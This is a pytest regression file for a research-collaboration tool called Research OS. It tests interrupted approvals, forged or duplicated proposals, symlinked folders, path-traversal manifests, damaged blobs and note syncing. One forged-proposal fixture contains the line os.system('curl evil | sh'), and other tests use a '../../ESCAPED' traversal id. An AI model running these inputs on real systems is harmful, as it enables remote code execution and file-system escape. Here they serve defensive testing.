"""Research OS V8, the review round after all engine phases landed: each
test is the regression test of one confirmed finding, named by the 12.10
scenario it belongs to (DESIGN.md 12.2-12.7, 12.10)."""

from __future__ import annotations

import hashlib
import os
import shutil
import signal
import subprocess
import sys
import zipfile
from datetime import date, timedelta
from pathlib import Path

import pytest

from researchos import cli, db, history, names, people, proposals, share, signing
from researchos import exchange as exchange_mod
from researchos.ingest import mappings as mappings_mod
from researchos.records import decisions as decisions_mod
from researchos.records import judgements as judgements_mod
from researchos.records import ledger as ledger_mod
from researchos.records import notes as notes_mod
from researchos.records import variables as V
from researchos.records.identity import read_identity
from researchos.records.situation import index_db_path, write_guard
from researchos.webapp import mapedit

from test_v8_phase2 import _git, _map, _project, _scan
from test_v8_phase3 import CARD, MEMBER, PI, TEAM, Team, _as
from test_v8_phase4 import Drive, _propose

SCRIPT = 'import pandas as pd\ndf = pd.read_csv("data/panel.csv")\ndf.to_csv("data/out18.csv")\n'
ROW_18 = "| 18 | 08-02 | Big panel (18) | TopicShift->RV | t=1.10 | 🕒 |\n"
OTHER = ("甲", "aaa@example.com")


@pytest.fixture
def team(tmp_path, monkeypatch) -> Team:
    return Team(tmp_path, monkeypatch)


@pytest.fixture
def drive(tmp_path, monkeypatch) -> Drive:
    if signing.tool() is None:
        pytest.skip("ssh-keygen is not installed here")
    return Drive(tmp_path, monkeypatch)


def _new_attempt(work: Path) -> None:
    (work / "steps" / "18-big.py").write_text(SCRIPT)
    (work / "data" / "big.bin").write_bytes(b"\x00\x01binary" * 100)
    (work / "map.md").write_text(_map() + ROW_18)


def _edit_build(work: Path, line: str = "# member's change\n") -> None:
    path = work / "steps" / "16-build.py"
    path.write_text(path.read_text() + line)


def _state(team: Team, root: Path) -> str:
    return proposals.listing(root)["proposals"][0]["state"]


# -- an approval interrupted half way (findings: 12.3 / 12.4 "a returned proposal never becomes a node") -----


def test_12_10_3_an_approval_killed_after_the_version_file_is_finished_by_approving_again(team):
    """12.10 #3: the PI's approval of a variable version (with a script
    change) is SIGKILLed after the card's version file was written and
    before it was confirmed. The proposal can no longer be returned (its
    file is already in the official version); approving again finds its own
    draft -- not a conflict -- confirms it once and records one decision."""
    with team.member():
        card_dir = team.work / ".researchos" / "variables" / "topicshift"
        card_dir.mkdir(parents=True)
        (card_dir / "v1.toml").write_text(CARD)
        _edit_build(team.work, "# v1 card\n")
        stored = proposals.write_proposal(
            team.work, proposals.make_proposal(team.work, "variable_version", "TopicShift 定义", attested="unknown",
                                               add=["steps/16-build.py"]))  # 12.13: the member adds the script
    code = (
        "import os, signal, sys\n"
        "from researchos import proposals\n"
        "from researchos.records import cards\n"
        "cards.confirm = lambda *a, **k: os.kill(os.getpid(), signal.SIGKILL)\n"
        "proposals.approve(sys.argv[1], sys.argv[2], rescan=False)\n"
    )
    env = {**os.environ, names.HOME_ENV_VAR: str(team.pi_home)}
    got = subprocess.run([sys.executable, "-c", code, str(team.official), stored.id], env=env, capture_output=True)
    assert got.returncode == -signal.SIGKILL, got.stderr.decode()
    with team.pi():
        assert (team.official / "steps" / "16-build.py").read_text().endswith("# v1 card\n")
        assert (team.official / ".researchos" / "variables" / "topicshift" / "v1.toml").is_file()
        changes = proposals.what_changes(stored, team.official)
        assert changes["approvable"] and not changes["conflicts"] and changes["resuming"]
        with pytest.raises(proposals.ProposalRefused) as refused:
            proposals.return_(team.official, stored.id, "不要了")
        assert refused.value.code == "approval_started"
        assert _state(team, team.official) == "pending"
        done = proposals.approve(team.official, stored.id, note="继续")
        card = V.open_card(team.official, "topicshift")
        assert card.in_use == 1 and [e.get("act") for e in card.entries].count("confirmed") == 1
        assert [d["proposal"] for d in decisions_mod.entries(team.official)] == [stored.id]
        assert done["decision"]["files"] == ["steps/16-build.py"]
        assert _state(team, team.official) == "approved"


def test_12_10_3_an_approval_stopped_at_the_attempt_row_cannot_be_returned_and_finishes(team, monkeypatch):
    """12.10 #3: an attempt_new approval stopped when the table row was
    being written leaves the proposal's script in place: returning is
    refused, approving again adds the row once."""
    with team.member():
        _new_attempt(team.work)
        stored = proposals.write_proposal(team.work, proposals.make_proposal(team.work, "attempt_new", "大面板"))
    with team.pi():
        real = mapedit.apply_edit
        monkeypatch.setattr(mapedit, "apply_edit", lambda *a, **k: (_ for _ in ()).throw(RuntimeError("killed")))
        with pytest.raises(RuntimeError):
            proposals.approve(team.official, stored.id, rescan=False)
        monkeypatch.setattr(mapedit, "apply_edit", real)
        assert (team.official / "steps" / "18-big.py").is_file()
        with pytest.raises(proposals.ProposalRefused) as refused:
            proposals.return_(team.official, stored.id, "不要")
        assert refused.value.code == "approval_started"
        proposals.approve(team.official, stored.id)
        assert (team.official / "map.md").read_text().count("| 18 |") == 1
        assert _state(team, team.official) == "approved"


def test_12_10_3_a_file_that_cannot_be_placed_refuses_the_approval_before_anything(team):
    """12.10 #3: a proposal one of whose files cannot be placed (its folder
    is a file in the official version) is refused with nothing applied --
    not even its other files -- and can still be returned."""
    with team.member():
        (team.work / "steps" / "18-ok.py").write_text("print('ok')\n")
        (team.work / "extra").mkdir()
        (team.work / "extra" / "x.py").write_text("print('x')\n")
        stored = proposals.write_proposal(team.work, proposals.make_proposal(team.work, "files", "两个文件"))
    with team.pi():
        (team.official / "extra").write_text("a file where the member has a folder\n")
        with pytest.raises(proposals.ProposalRefused) as refused:
            proposals.approve(team.official, stored.id)
        assert refused.value.code == "not_approvable"
        assert not (team.official / "steps" / "18-ok.py").exists()
        assert not proposals.journal_path(team.official, stored.id).exists()
        assert not list((team.official / "steps").glob(".*tmp*"))
        assert proposals.return_(team.official, stored.id, "路径冲突")["act"] == "returned"


def test_12_10_3_content_damaged_on_the_drive_refuses_the_approval_before_anything(team):
    """12.10 #3: a blob whose bytes a sync service changed (same name, same
    size) is found before the first file is placed -- the script listed
    before it included: nothing applied."""
    with team.member():
        _new_attempt(team.work)
        (team.work / "data" / "big.bin").rename(team.work / "zz-big.bin")
        stored = proposals.write_proposal(team.work, proposals.make_proposal(team.work, "attempt_new", "大面板",
                                                                             add=["zz-big.bin"]))
    blob = next((team.exchange / "提议" / MEMBER[1] / "blobs").iterdir())
    data = bytearray(blob.read_bytes())
    data[3] ^= 0xFF
    blob.write_bytes(bytes(data))
    with team.pi():
        assert proposals.what_changes(stored, team.official)["approvable"]  # sizes match: only the hash tells
        with pytest.raises(proposals.ProposalRefused):
            proposals.approve(team.official, stored.id)
        assert not (team.official / "steps" / "18-big.py").exists()
        assert "| 18 |" not in (team.official / "map.md").read_text()
        assert proposals.return_(team.official, stored.id, "内容坏了")["act"] == "returned"


def test_12_10_3_a_decision_recorded_without_its_outcome_is_finished_never_returned(team, monkeypatch, capsys):
    """12.3 (approving publishes; returning publishes an outcome): the
    shared drive refuses the outcome after the decision was recorded. The
    PI edits a file the approval placed; returning is refused, approving
    again only writes the outcome -- nothing applied twice, the PI's edit
    kept, decisions.toml and the member's view agree."""
    with team.member():
        _edit_build(team.work)
        (team.work / "newfile.md").write_text("new\n")
        stored = proposals.write_proposal(team.work, proposals.make_proposal(team.work, "files", "两处"))
    with team.pi():
        real = proposals._outcome
        monkeypatch.setattr(proposals, "_outcome", lambda *a, **k: (_ for _ in ()).throw(
            exchange_mod.ExchangeError("unreachable", "Permission denied")))
        with pytest.raises(exchange_mod.ExchangeError):
            proposals.approve(team.official, stored.id, rescan=False)
        monkeypatch.setattr(proposals, "_outcome", real)
        assert [d["act"] for d in decisions_mod.entries(team.official)] == ["approved"]
        build = team.official / "steps" / "16-build.py"
        build.write_text(build.read_text() + "# the PI's own line\n")
        with pytest.raises(proposals.ProposalRefused) as refused:
            proposals.return_(team.official, stored.id, "算了")
        assert refused.value.code == "approval_started"
        assert cli.main(["approve", stored.id, str(team.official)]) == 0  # the command line finishes it too
        assert "applied  newfile.md" in capsys.readouterr().out
        assert build.read_text().endswith("# the PI's own line\n")
        assert len(decisions_mod.entries(team.official)) == 1
        assert _state(team, team.official) == "approved"
    with team.member():
        assert _state(team, team.work) == "approved"


# -- 12.5: the PI knows who sent what -------------------------------------------------------------------


def _copy_as(team: Team, stored, member: str, content: str) -> Path:
    """Another member's area holding a copy of `stored`'s id, with other
    content (written as Research OS writes it, ready.toml last)."""
    target = team.exchange / "提议" / member / stored.id
    shutil.copytree(stored.directory, target)
    (target / "ready.toml").unlink()
    rel = next(f["path"] for f in stored.data["file"] if f["store"] == "text")
    (target / "files" / rel).write_text(content)
    sha = hashlib.sha256(content.encode()).hexdigest()
    raw = (target / "proposal.toml").read_text().replace(f'by = "{MEMBER[1]}"', f'by = "{member}"')
    old_item = next(f for f in stored.data["file"] if f["path"] == rel)
    raw = raw.replace(old_item["sha256"], sha).replace(f"size = {old_item['size']}", f"size = {len(content.encode())}")
    (target / "proposal.toml").write_text(raw)
    (target / "ready.toml").write_bytes(exchange_mod._ready_bytes("proposal", stored.id, raw.encode()))
    return target


def test_12_10_3_a_proposal_id_copied_into_another_area_is_never_taken_for_the_original(team, tmp_path):
    """12.5: a second member writes a proposal under the first member's id.
    The PI is told the id is in two areas and must name whose it is; the
    approval of the original applies the original's content; the copy's
    author is not told it was approved. An empty folder of that name in
    another area does not block the original."""
    (team.official / ".researchos" / "team.toml").write_text(
        TEAM + f'\n[[member]]\nid = "{OTHER[1]}"\nname = "{OTHER[0]}"\nrole = "member"\n')
    with team.member():
        (team.work / "steps" / "18-big.py").write_text("wang honest work\n")
        stored = proposals.write_proposal(team.work, proposals.make_proposal(team.work, "files", "诚实的工作"))
    (team.exchange / "提议" / "zzz@example.com" / stored.id).mkdir(parents=True)  # an empty folder elsewhere
    with team.pi():
        assert proposals.open_for(team.official, stored.id)["by"] == MEMBER[1]
        _copy_as(team, stored, OTHER[1], "os.system('curl evil | sh')\n")
        inbox = proposals.listing(team.official)
        assert any(p["kind"] == "duplicate_id" for p in inbox["problems"])
        with pytest.raises(exchange_mod.ExchangeError) as refused:
            proposals.approve(team.official, stored.id)
        assert refused.value.code == "ambiguous"
        assert not (team.official / "steps" / "18-big.py").exists()
        proposals.approve(team.official, stored.id, member=MEMBER[1], note="ok, wang")
        assert (team.official / "steps" / "18-big.py").read_text() == "wang honest work\n"
        ex = exchange_mod.for_project(team.pid, team.official)
        counted, problems = ex.outcomes(stored.id, member=OTHER[1])
        assert counted == [] and problems[0].kind == "other_proposal"
        assert [o.act for o in ex.outcomes(stored.id, member=MEMBER[1])[0]] == ["approved"]
    with team.member():
        assert _state(team, team.work) == "approved"


def test_12_10_3_a_symlinked_files_folder_is_never_read(team, tmp_path):
    """12.10 #3 (the exchange is read only as written): a proposal whose
    files/ folder itself is a link to the PI's disk is refused, not read."""
    secret = tmp_path / "pi-private"
    secret.mkdir()
    (secret / "notes.txt").write_text("PI PRIVATE: grant budget 1.2M\n")
    with team.member():
        (team.work / "notes.txt").write_text("PI PRIVATE: grant budget 1.2M\n")
        stored = proposals.write_proposal(team.work, proposals.make_proposal(team.work, "files", "x"))
    shutil.rmtree(stored.directory / "files")
    (stored.directory / "files").symlink_to(secret, target_is_directory=True)
    with team.pi():
        with pytest.raises(exchange_mod.ExchangeError):
            ex = exchange_mod.for_project(team.pid, team.official)
            ex.open_proposal(stored.id).content_path({"path": "notes.txt", "store": "text"})
        changes = proposals.what_changes(ex.open_proposal(stored.id), team.official)
        assert not changes["approvable"] and "diff" not in changes["files"][0]


# -- the table changed on both sides; the abandonment's reason in the table ------------------------------


def test_12_12_the_attempt_table_changed_elsewhere_does_not_block_a_new_row(team):
    """12.12 (overrules the file-level rule this test held before): the
    member adds row 18; the PI adds row 17 to the same table. The table
    conflicts by ROW: row 18 is untouched on the official side, so the
    proposal is approvable, and approving keeps the PI's row 17."""
    with team.member():
        (team.work / "map.md").write_text(_map() + ROW_18)
        stored = proposals.write_proposal(team.work, proposals.make_proposal(team.work, "attempt_new", "18"))
    with team.pi():
        pi_table = _map() + "| 17 | 08-01 | PI row (17) | X->Y | t=1.0 | 🕒 |\n"
        (team.official / "map.md").write_text(pi_table)
        changes = proposals.what_changes(stored, team.official)
        assert changes["approvable"] and not changes["conflicts"] and changes["attempt"]["table_moved"]
        proposals.approve(team.official, stored.id)
        text = (team.official / "map.md").read_text()
        assert "| 17 | 08-01 | PI row (17) |" in text and "| 18 |" in text


def test_12_10_3_an_approved_abandonment_writes_its_reason_into_the_table(team):
    """12.4: approving an abandonment records the result and the reason in
    the attempt table, and its evidence is frozen without crediting the
    member with versions of files they never changed (12.6)."""
    with team.member():
        (team.work / "map.md").write_text(_map("☠️").replace("t=2.91", "t=0.20"))
        stored = proposals.write_proposal(
            team.work, proposals.make_proposal(team.work, "verdict_change", "放弃 16", reason="效应消失了"))
    with team.pi():
        proposals.approve(team.official, stored.id, note="同意")
        row = next(line for line in (team.official / "map.md").read_text().splitlines() if line.startswith("| 16 |"))
        assert "t=0.20" in row and "放弃理由：效应消失了" in row and "☠️" in row
        entry = decisions_mod.entries(team.official)[-1]
        assert entry["act"] == "abandoned" and entry["reason"] == "效应消失了" and entry["result"] == "t=0.20"
        for rel in ("steps/16-build.py", "data/panel.csv"):
            newest = history.versions(team.official, rel)["versions"][0]
            assert newest["who"] != MEMBER[1] and newest["source"] != "approval"
        table = history.versions(team.official, "map.md")["versions"][0]
        assert table["who"] == MEMBER[1] and table["approved_by"] == PI[1] and table["note"] == "同意"


def test_12_10_3_an_approved_new_attempt_credits_the_table_version_to_the_member(team):
    """12.3 (every entry recorded with by and approved_by): the attempt
    table's own new version, written through the map editor, carries the
    member and the PI like the files the approval copied in."""
    with team.member():
        _new_attempt(team.work)
        stored = proposals.write_proposal(team.work, proposals.make_proposal(team.work, "attempt_new", "大面板"))
    with team.pi():
        proposals.approve(team.official, stored.id, note="同意")
        newest = history.versions(team.official, "map.md")["versions"][0]
        assert newest["who"] == MEMBER[1] and newest["approved_by"] == PI[1] and newest["note"] == "同意"


def test_12_10_2_in_a_git_project_an_approved_version_keeps_the_member_and_the_approval(team):
    """12.6: in a git project, the version an approval wrote shows the
    member, the PI who approved it and the PI's note -- before and after
    the PI commits it."""
    with team.pi():
        _git(team.official, "init", "-q")
        _git(team.official, "add", "-A")
        _git(team.official, "commit", "-q", "-m", "init")
    with team.member():
        _edit_build(team.work)
        stored = proposals.write_proposal(team.work, proposals.make_proposal(team.work, "files", "改脚本"))
    with team.pi():
        proposals.approve(team.official, stored.id, note="同意")
        newest = history.versions(team.official, "steps/16-build.py")["versions"][0]
        assert newest["who"] == MEMBER[1] and newest["approved_by"] == PI[1] and newest["note"] == "同意"
        _git(team.official, "commit", "-q", "-am", "take wang's change")
        found = history.versions(team.official, "steps/16-build.py")
        assert found["origin"] == "git"
        newest = found["versions"][0]
        assert newest["commit"] and newest["who"] == MEMBER[1] and newest["approved_by"] == PI[1]
        assert newest["committed_by"] == PI[1] and newest["commit_note"] == "take wang's change"


# -- decisions.toml that lost entries (9.3) ---------------------------------------------------------------


def test_12_10_3_a_decisions_file_that_lost_an_entry_is_not_obeyed_silently(team):
    """9.3 / 12.4 (an abandoned route keeps its basis): the first of two
    decisions -- an abandonment with its reason and evidence -- vanishes
    from decisions.toml. Research OS says so, refuses the next approval
    before anything, still shows the lost basis, and restores it on the
    PI's answer."""
    with team.member():
        (team.work / "map.md").write_text(_map("☠️").replace("t=2.91", "t=0.20"))
        first = proposals.write_proposal(
            team.work, proposals.make_proposal(team.work, "verdict_change", "放弃", reason="效应消失了"))
    with team.pi():
        proposals.approve(team.official, first.id)
    with team.member():
        (team.work / "a.md").write_text("a\n")
        second = proposals.write_proposal(team.work, proposals.make_proposal(team.work, "files", "a", only=["a.md"]))
    with team.pi():
        proposals.approve(team.official, second.id)
        path = decisions_mod.decisions_path(team.official)
        text = path.read_text()
        blocks = text.split("[[decision]]")
        path.write_text(blocks[0] + "[[decision]]" + blocks[2])  # an older copy, a merge: the first is gone
        loaded, decision = decisions_mod.assess(team.official)
        assert decision.reason == "shrunk" and decision.missing[0]["act"] == "abandoned"
        assert decisions_mod.summary(team.official)["state"] == "shrunk"
        lost = decisions_mod.for_attempt(team.official, "attempt:map.md#16")
        assert lost and lost[0]["missing_from_file"] and lost[0]["reason"] == "效应消失了"
        with pytest.raises(decisions_mod.DecisionRefused):
            decisions_mod.require_writable(team.official)
        with write_guard(team.official, human=True) as held:
            assert decisions_mod.answer_shrunk(team.official, "restore", lock=held) == (1, 1)
        assert decisions_mod.assess(team.official)[1].may_write
        restored = decisions_mod.for_attempt(team.official, "attempt:map.md#16")
        assert restored[0]["reason"] == "效应消失了" and restored[0]["recovered_from"] == decision.missing[0]["id"]


# -- 12.1: every entry carries `by` -----------------------------------------------------------------------


def test_12_10_2_hand_drawn_links_carry_who_drew_them(tmp_path, monkeypatch):
    """12.1 / 12.7: 「关联文件」 and 「补上来源」 (belongs_to / generates
    mappings) are written with `by` when this machine knows who it is."""
    with _as(monkeypatch, tmp_path / "home"):
        people.write_me(*PI)
        root = _project(tmp_path / "p")
        mappings_mod.add_mapping(root, "steps/17-plot.py", "figs/fig1.png", "generates")
        mappings_mod.add_mapping(root, "figs/fig1.png", "attempt:map.md#16", "belongs_to")
        import tomllib

        entries = tomllib.loads((root / ".researchos" / "mappings.toml").read_text())["mapping"]
        assert [e.get("by") for e in entries] == [PI[1], PI[1]]
        assert len(mappings_mod.load_mappings(root).mappings) == 2


# -- 12.6: Excel tables by column names ------------------------------------------------------------------


def _xlsx(path: Path, header: tuple[str, ...], rows: int) -> None:
    strings = list(header)
    cells = "".join(f'<c r="{chr(65 + i)}1" t="s"><v>{i}</v></c>' for i in range(len(header)))
    body = "".join(f'<row r="{r}">' + "".join(f'<c r="{chr(65 + i)}{r}"><v>{r * 10 + i}</v></c>' for i in range(len(header)))
                   + "</row>" for r in range(2, rows + 2))
    last = f"{chr(64 + len(header))}{rows + 1}"
    sheet = ('<?xml version="1.0"?><worksheet xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main">'
             f'<dimension ref="A1:{last}"/><sheetData><row r="1">{cells}</row>{body}</sheetData></worksheet>')
    shared = ('<?xml version="1.0"?><sst xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main">'
              + "".join(f"<si><t>{s}</t></si>" for s in strings) + "</sst>")
    with zipfile.ZipFile(path, "w") as archive:
        archive.writestr("xl/worksheets/sheet1.xml", sheet)
        archive.writestr("xl/sharedStrings.xml", shared)


def test_12_10_2_an_excel_table_says_which_column_was_added(tmp_path):
    """12.6: for an Excel table, history keeps the column names and counts
    the rows under the header -- 「新增列 log_ret」, as for a CSV."""
    a, b = tmp_path / "a.xlsx", tmp_path / "b.xlsx"
    _xlsx(a, ("id", "x"), 3)
    _xlsx(b, ("id", "log_ret"), 4)
    sa, sb = history.data_summary(a, "a.xlsx"), history.data_summary(b, "b.xlsx")
    assert sa["columns"] == ["id", "x"] and sa["rows"] == 3 and sb["rows"] == 4
    sentence = history.table_sentence(sa, sb)
    assert "新增列 log_ret" in sentence and "删除列 x" in sentence and "行数 3 → 4" in sentence


# -- the shared drive: one project per folder, project ids, damaged blobs, pruning ------------------------


def test_12_10_3_a_second_project_cannot_share_the_first_projects_folder(drive, tmp_path):
    """12.2: a shared folder holds one project. Setting it for a second
    project, publishing a second project into it, or joining a folder that
    holds two projects without naming one, is refused."""
    with drive.pi():
        other = _project(tmp_path / "other")
        share.team_init(other)
        other_id = read_identity(other).identity.id
        with pytest.raises(exchange_mod.ExchangeError):
            exchange_mod.configure(other_id, drive.shared, other)
        with pytest.raises(share.ShareError) as refused:
            share.publish(other, shared=drive.shared)
        assert refused.value.code == "other_project"
        own = tmp_path / "other-shared"
        own.mkdir()
        exchange_mod.configure(other_id, own, other)
        share.publish(other)
    # A careless copy puts the second project's snapshot in the first folder.
    copied = drive.shared / "已发布" / "snapshots" / "2"
    shutil.copytree(own / "已发布" / "snapshots" / "1", copied)
    raw = (copied / "manifest.toml").read_text().replace("\nseq = 1\n", "\nseq = 2\n")
    (copied / "manifest.toml").write_text(raw)
    (copied / "ready.toml").unlink()
    (copied / "ready.toml").write_bytes(exchange_mod._ready_bytes("snapshot", "2", raw.encode()))
    with drive.member():
        with pytest.raises(share.ShareError) as refused:
            share.join(drive.shared, tmp_path / "w2")
        assert refused.value.code == "ambiguous_project" and set(refused.value.details["projects"]) == {drive.pid, other_id}
        joined = share.join(drive.shared, tmp_path / "w3", project=drive.pid)
        assert joined["project"] == drive.pid


def test_12_10_3_a_manifest_naming_a_path_as_its_project_is_never_read(drive, tmp_path):
    """12.5 / 12.2: a snapshot whose project id is a path ("../../ESCAPED")
    is refused as invalid; nothing is written outside the member's home."""
    forged = tmp_path / "forged"
    shutil.copytree(drive.shared, forged)
    snap = forged / "已发布" / "snapshots" / "1"
    raw = (snap / "manifest.toml").read_text().replace(f'project = "{drive.pid}"', 'project = "../../ESCAPED"')
    (snap / "manifest.toml").write_text(raw)
    (snap / "ready.toml").write_bytes(exchange_mod._ready_bytes("snapshot", "1", raw.encode()))
    _, problems = share.read_snapshots(forged)
    assert any("project id" in p.detail for p in problems)
    with drive.member():
        with pytest.raises(share.ShareError):
            share.join(forged, tmp_path / "w2")
    assert not (tmp_path / "ESCAPED").exists() and not (drive.member_home.parent / "ESCAPED").exists()
    with pytest.raises(proposals.ProposalRefused):
        proposals.base_dir("../../ESCAPED")


def test_12_10_3_a_damaged_published_blob_is_reported_never_pointed_at_again(drive):
    """12.10 #3: a published blob whose bytes a sync service changed (same
    size) is never trusted again: publishing that content says so."""
    with drive.pi():
        fig = drive.official / "figs" / "fig1.png"
        fig.write_bytes(b"\x89PNG new figure\x00")
        share.publish(drive.official)
        blob = drive.shared / "已发布" / "blobs" / hashlib.sha256(fig.read_bytes()).hexdigest()
        data = bytearray(blob.read_bytes())
        data[-1] ^= 0xFF
        blob.write_bytes(bytes(data))
        with pytest.raises(exchange_mod.ExchangeError) as refused:
            exchange_mod.put_blob_once(blob.parent, blob.name, fig)
        assert refused.value.code == "damaged"


def test_12_10_3_the_pi_prunes_blobs_no_recent_snapshot_references(drive):
    """12.2: the PI may prune old blobs no snapshot after a chosen date
    references -- listed first, removed only when confirmed; the latest
    snapshot's are always kept."""
    with drive.pi():
        fig = drive.official / "figs" / "fig1.png"
        old_sha = hashlib.sha256(fig.read_bytes()).hexdigest()
        fig.write_bytes(b"\x89PNG second version\x00")
        share.publish(drive.official)
        new_sha = hashlib.sha256(fig.read_bytes()).hexdigest()
        tomorrow = (date.today() + timedelta(days=1)).isoformat()
        shown = share.prune_blobs(drive.official, tomorrow)
        assert [b["sha256"] for b in shown["prunable"]] == [old_sha] and not shown["removed"]
        assert (drive.shared / "已发布" / "blobs" / old_sha).exists()
        assert share.prune_blobs(drive.official, date.today().isoformat())["prunable"] == []
        done = share.prune_blobs(drive.official, tomorrow, apply=True)
        assert done["removed"] == [old_sha] and not (drive.shared / "已发布" / "blobs" / old_sha).exists()
        assert (drive.shared / "已发布" / "blobs" / new_sha).exists()
    with drive.member():
        assert share.sync(drive.work)["seq"] == 2


# -- 12.4: notes travel with sync, no approval --------------------------------------------------------------


def test_12_10_3_a_members_note_reaches_the_official_version_and_both_see_each_others(drive):
    """12.4: a note on a node needs no approval and travels with the
    member's next sync, appended with `by`; the official notes come back
    to the member's ledger -- never forked into a .official copy."""
    with drive.member():
        assert cli.main(["ingest", str(drive.work)]) == 0
        notes_mod.add_note(drive.work, "steps/16-build.py", "member: 这里的残差要检验", via="cli")
        conn = db.connect(index_db_path(drive.pid))
        try:
            edge = next(e for e in db.query_edges(conn) if e["extractor"] != "mapping")
        finally:
            conn.close()
        key = (edge["src"], edge["dst"], edge["type"], edge["extractor"])
        judgements_mod.judge(drive.work, key, "rejected", via="cli")
    with drive.pi():
        notes_mod.add_note(drive.official, "steps/16-build.py", "PI: 换成百分点", via="cli")
        assert share.publish(drive.official)["published"]
    with drive.member():
        synced = share.sync(drive.work)
        assert synced["entries_sent"] == 2 and not synced["conflicts"]
        assert not (drive.work / ".researchos" / "notes.official.toml").exists()
        assert synced["notes_waiting"] == [".researchos/notes.toml"]
    with drive.pi():
        done = share.publish(drive.official)
        assert done["collected"]["appended"] == 2 and done["published"]
        judged = ledger_mod.load_judgements(drive.official).ledger.entries
        assert [(j.get("verdict"), j.get("by"), j.key) for j in judged] == [("rejected", MEMBER[1], key)]
        texts = {n["text"]: n for n in notes_mod.notes_for(drive.official)["notes"]}
        assert texts["member: 这里的残差要检验"]["by"] == MEMBER[1] and "PI: 换成百分点" in texts
        assert share.publish(drive.official)["collected"]["appended"] == 0  # carried once
    with drive.member():
        synced = share.sync(drive.work)
        assert ".researchos/notes.toml" in synced["updated"] and not synced["conflicts"]
        mine = {n["text"] for n in notes_mod.notes_for(drive.work)["notes"]}
        assert mine == {"member: 这里的残差要检验", "PI: 换成百分点"}
        assert notes_mod.notes_for(drive.work)["trusted"]
        assert not list((drive.work / ".researchos").glob("notes.official*"))
        assert share.sync(drive.work)["entries_sent"] == 0
    drive.witness.look()


def test_12_10_3_a_proposal_dry_run_names_the_notes_it_does_not_carry(drive):
    """12.3 (nothing dropped silently): a proposal's dry run says that the
    member's notes travel with sync, not with the proposal."""
    with drive.member():
        assert cli.main(["ingest", str(drive.work)]) == 0
        notes_mod.add_note(drive.work, "steps/16-build.py", "笔记", via="cli")
        _edit_build(drive.work)
        draft = proposals.make_proposal(drive.work, "files", "改脚本")
        assert any(n["path"] == ".researchos/notes.toml" and "sync" in n["reason"] for n in draft.data["not_carried"])


def test_12_8_the_readme_names_the_renamed_repository():
    """12.8: the documentation names the GitHub repository research-os."""
    readme = (Path(__file__).resolve().parents[1] / "README.md").read_text()
    assert "research-context-engine" not in readme and "LinyingL/research-os" in readme
